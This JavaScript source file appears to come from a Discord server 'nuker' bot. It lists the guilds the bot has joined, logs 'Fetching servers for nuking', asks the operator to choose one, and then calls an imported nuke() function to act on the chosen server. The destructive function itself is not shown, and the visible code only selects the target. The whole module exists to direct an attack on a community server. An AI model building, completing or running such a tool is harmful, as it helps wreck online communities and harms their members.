import readline from "readline"; // Import the readline module to handle user input from the terminal
import { client } from "../index.js"; // Import the 'client' object, assumed to be the bot client
import logger from "../logging/logger.js"; // Import the logger to log important actions
import { centerText } from "./welcome.js"; // Import the 'centerText' function to format text for console output
import pc from "picocolors"; // Import the picocolors library for colorful terminal output
import nuke from "../nuke/nuke.js"; // Import the 'nuke' function, presumably for nuking the server

// Initialize readline interface to get input from the terminal
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

let guilds = []; // Array to store the list of available guilds (servers)
let guildIndex = 1; // Index for numbering the guilds
var selectedGuild = null; // Variable to store the selected guild

// Function to prompt the user for a server number
async function askForServerNumber() {
  rl.question(pc.yellow("Enter The Server Number: "), async (number) => {
    const guildNumber = Number(number); // Convert the input to a number

    // Validate if the input is a valid server number
    if (
      !Number.isInteger(guildNumber) || // Check if it's a valid integer
      guildNumber < 1 || // Ensure the number is greater than 0
      guildNumber >= guildIndex // Ensure the number is less than the total guilds
    ) {
      console.log(pc.red("Invalid server number. Please try again.")); // Print an error message for invalid input
      await logger.error(`Invalid server number: ${guildNumber}`); // Log the invalid attempt
      return askForServerNumber(); // Recursively call the function to ask for input again
    }

    // Set the selected guild based on the user's input
    selectedGuild = guilds[guildNumber - 1];
    await logger.info(
      `User selected ${selectedGuild.name} (ID: ${selectedGuild.id})` // Log the selected guild information
    );

    nuke(); // Call the 'nuke' function to perform the action on the selected guild
  });
}

// Function to fetch the guilds (servers) the bot is a part of
async function getGuild() {
  await logger.info("Fetching servers for nuking..."); // Log the action of fetching guilds

  guildIndex = 1; // Reset the guild index before populating the list

  // Map through the client's guilds to create a list of guilds with their names, ids, and indexes
  guilds = client.guilds.cache.map((guild) => ({
    index: guildIndex++, // Increment the index for each guild
    name: guild.name, // Store the name of the guild
    id: guild.id, // Store the ID of the guild
  }));

  // Check if there are no guilds available
  if (guilds.length === 0) {
    console.log(pc.red("No servers found.")); // Print an error message if no guilds are found
    await logger.warn("No servers available."); // Log the warning
    rl.close(); // Close the readline interface
    return; // Exit the function
  }

  // Loop through the list of guilds and print each one to the console
  guilds.forEach((guild) => {
    console.log(pc.cyan(centerText(`${guild.index}: ${guild.name}`))); // Print the guild info in a centered and colored format
  });

  askForServerNumber(); // Prompt the user to select a server number
}

export { getGuild, selectedGuild }; // Export the getGuild function and the selectedGuild variable for use in other modules
